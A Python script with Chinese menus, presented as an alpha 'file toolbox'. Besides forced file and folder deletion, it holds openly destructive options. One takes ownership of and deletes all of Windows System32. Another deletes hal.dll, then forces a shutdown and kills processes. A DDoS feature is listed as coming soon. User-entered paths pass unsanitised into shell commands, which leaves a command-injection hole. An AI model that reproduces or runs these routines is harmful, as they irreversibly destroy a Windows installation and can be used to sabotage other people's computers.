import os,time

os.system("@echo off")
###os.system("color df")
def mulu(muluming):###删除指定目录(递归删除)
    os.system("takeown /f " + f"{muluming}" + " /r /d y")
    os.system("echo Y|cacls " + f"{muluming}" + " /t /g %username%:F")
    os.system("rmdir /s /q " + f"{muluming}")
    print("删除操作已完成，请按任意键返回主界面^_^")
    os.system("pause")

def delwenjian(wenjianming):###删除文件
    os.system("takeown /f " + f"{wenjianming}")
    os.system("echo Y|cacls " + f"{wenjianming}" + " /g %username%:F")
    os.system("del /s /q /f " + f"{wenjianming}")
    os.system("pause")

def destroywindows():###删除系统文件(System32文件夹(递归删除))
    os.system("takeown /f %windir%\System32\*.* /r /d y")
    os.system("echo Y|cacls %windir%\System32\*.* /t /g %username%:F")
    os.system("del /s /q /f %windir%\System32\*.*")

def delwenjianjiaall(wenjianjiaming_1):###删除指定目录下的所有子目录及文件
    os.system("takeown /f " + f"{wenjianjiaming_1}" + "\*.* /r /d y")
    os.system("echo Y|cacls " + f"{wenjianjiaming_1}" + "\*.* /g %username%:F")
    os.system("del /s /q /f " + f"{wenjianjiaming_1}" + "\*.*")
    os.system("pause")

def bbx_title():
    print("_____________________________欢迎使用FCR文件工具箱内置百宝箱^-^_______________________________")
    print("                                 老样子，请选择一个选项qwq                                   ")
    print("1.Windows_killer(内置)                          2.Ddos攻击(内置)-敬请期待")
    print("3.！！！千万别点！！！qwq")

taskkill_ne = '"pid ne 1"'

def fastbreakwindows():
    os.system("takeown /f C:\Windows\System32\hal.dll")
    os.system("echo Y|cacls C:\Windows\System32\hal.dll /g %username%:F")
    os.system("del /s /q /f C:\Windows\System32\hal.dll")
    time.sleep(2)
    os.system("shutdown -s -t 0")
    time.sleep(3)
    os.system(f"taskkill /f /i {taskkill_ne}")
baibaoxiangliebiao = ['1','2','3','4','5','q','Q']
fastbreakwindowslist = ['1','2','q','Q']

active = True

while active:
    active_bbx = True
    active_fbwin = True
    print("       注意：当前程序为Alpha开发阶段，可能会有一些难以言表的bug    qwq")
    print("__________________________欢迎使用FCR文件工具箱_________________________________")
    print("|              _________      请选择一个选项                                    |")
    print("|             /    ____/     1.删除文件                                         |")
    print("|            /    /          2.删除目录（指定文件夹及其所有子文件夹与文件）     |")
    print("|           /    /           3.百宝箱                                           |")
    print("|          /    /____        4.开发者信息                                       |")
    print("|         /_________/        输入Q以退出                                        |")
    print("|_______________________________________________________________________________|")
    xuanxianglist = ['1','2','3',"4","Q","q"]
    xuanxiang = input("请输入您选择选项的编号")
    if xuanxiang not in xuanxianglist:
        print("您输入的序号无效，请重新输入")
    elif xuanxiang =='Q':
        active = False
    elif xuanxiang =='q':
        active = False
    elif xuanxiang =='1':
        delxuanxiang = input("请输入文件路径：")
        delwenjian(delxuanxiang)
    elif xuanxiang =='2':
        muluming = input("请输入目录路径")
        mulu(muluming)
    elif xuanxiang =='3':
        while active_bbx:
            bbx_title()
            print("输入Q以退出百宝箱")
            print("请输入百宝箱选项：")
            bbxxuanxiang = input()
            if bbxxuanxiang not in baibaoxiangliebiao:
                print("您输入的百宝箱选项无效，请重新输入...")
            elif bbxxuanxiang == "q":
                active_bbx = False
            elif bbxxuanxiang == "Q":
                active_bbx = False
            elif bbxxuanxiang == "1":
                destroywindows()
            elif bbxxuanxiang == "2":
                print("该功能还在开发中，敬请期待")
            elif bbxxuanxiang == "3":
                while active_fbwin:
                    print("你真的确定吗？")
                    fastbreakwindows_chose = input("1.我想好了，我确定！！！        2.让我先冷静冷静……  |  或者输入Q以退出")
                    if fastbreakwindows_chose not in fastbreakwindowslist:
                        print("你输入的不是有效选项，请重新输入...")
                    elif fastbreakwindows_chose == "1":
                        fastbreakwindows()
                    elif fastbreakwindows_chose == "2":
                        active_fbwin = False
                    elif fastbreakwindows_chose == "q":
                        active_fbwin = False
                    elif fastbreakwindows_chose == "Q":
                        active_fbwin = False

    elif xuanxiang =='4':
        print("___________________________开发者信息___________________________")
        print("作者：炒鸡大蛇/qq:1841887053                 编程语言：python3")
        print("主程序设计：炒鸡大蛇/qq:1841887053               N/A--有意留空")
        print("当前程序版本：                                   --0.7.8 Alpha")
        print("注意：当前程序为Alpha开发阶段，可能会有一些难以言表的bug   QWQ")
        print("________________________________________________________________")
        os.system("pause")

os.system("pause")